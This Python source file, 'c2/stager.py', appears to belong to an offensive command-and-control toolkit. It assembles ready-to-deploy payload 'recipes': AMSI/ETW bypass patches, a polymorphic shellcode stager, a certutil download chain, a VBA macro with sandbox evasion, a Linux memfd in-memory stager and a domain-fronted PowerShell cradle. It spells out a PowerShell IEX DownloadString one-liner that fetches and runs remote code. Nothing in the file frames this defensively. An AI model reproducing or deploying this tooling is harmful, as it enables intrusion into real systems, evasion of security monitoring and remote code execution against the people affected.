"""
c2/stager.py — Payload Staging Engine

Combines Hider's existing engines (poly, patch, loader, lolbin, front, evasion)
into pre-built "recipes" that generate ready-to-deploy payloads.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from patch_engine import PatchEngine
from poly_engine import PolyEngine
from loader_engine import LoaderEngine
from lolbin_engine import LOLBinEngine
from front_engine import FrontEngine
from macro_engine import MacroEngine
from evasion_engine import EvasionEngine

STAGE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stages")
os.makedirs(STAGE_DIR, exist_ok=True)


class Stager:

    @staticmethod
    def windows_full(beacon_url, stage_id="win_full"):
        """
        Recipe: AMSI+ETW patch → polymorphic beacon download → shellcode stager.
        Returns the path to the staged .ps1 file.
        """
        # 1) Generate AMSI+ETW patch
        patch = PatchEngine.all_patches(obfuscate=False)

        # 2) Generate shellcode stager
        stager = LoaderEngine.ps_shellcode_stager(beacon_url, obfuscate=False)

        # 3) Combine
        combined = f"# AMSI/ETW Bypass\n{patch}\n\n# Shellcode Stager\n{stager}"

        # 4) Wrap polymorphically
        wrapped = PolyEngine.wrap_powershell(combined, layers=2)

        # 5) Write to staging directory
        out_path = os.path.join(STAGE_DIR, stage_id + ".ps1")
        with open(out_path, 'w') as f:
            f.write(wrapped)

        return out_path

    @staticmethod
    def lnk_dropper(c2_url, stage_id="lnk_drop"):
        """
        Recipe: certutil download chain wrapped in a .lnk shortcut.
        """
        cmd = LOLBinEngine.certutil_stager(c2_url)
        out_path = os.path.join(STAGE_DIR, stage_id + ".txt")
        with open(out_path, 'w') as f:
            f.write(cmd)
        return out_path

    @staticmethod
    def office_macro(beacon_url, stage_id="office_macro"):
        """
        Recipe: VBA macro with sandbox evasion that downloads + executes.
        """
        payload = f'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'{beacon_url}\')"'
        out_path = os.path.join(STAGE_DIR, stage_id + ".vba")
        MacroEngine.generate_vba(
            payload=payload,
            output_path=out_path,
            check_domain=True,
            min_ram_gb=4,
            min_cores=2,
            sleep_ms=3000
        )
        return out_path

    @staticmethod
    def linux_memfd(beacon_url, stage_id="linux_memfd"):
        """
        Recipe: Linux memfd_create stager.
        """
        stager = LoaderEngine.bash_memfd_stager(beacon_url)
        out_path = os.path.join(STAGE_DIR, stage_id + ".sh")
        with open(out_path, 'w') as f:
            f.write(stager)
        return out_path

    @staticmethod
    def fronted_ps(real_host, front_host, path, stage_id="fronted"):
        """
        Recipe: Domain-fronted PowerShell IEX download cradle.
        """
        iex = FrontEngine.iex_one_liner(real_host, front_host, path)
        wrapped = PolyEngine.wrap_powershell(iex, layers=1)
        out_path = os.path.join(STAGE_DIR, stage_id + ".ps1")
        with open(out_path, 'w') as f:
            f.write(wrapped)
        return out_path

    @staticmethod
    def list_recipes():
        return {
            "windows_full":  "AMSI/ETW patch + poly shellcode stager (PowerShell)",
            "lnk_dropper":   "Certutil download chain in a LOLBin one-liner",
            "office_macro":  "VBA macro with sandbox evasion + download exec",
            "linux_memfd":   "In-memory ELF execution via memfd_create",
            "fronted_ps":    "Domain-fronted polymorphic PowerShell IEX cradle",
        }
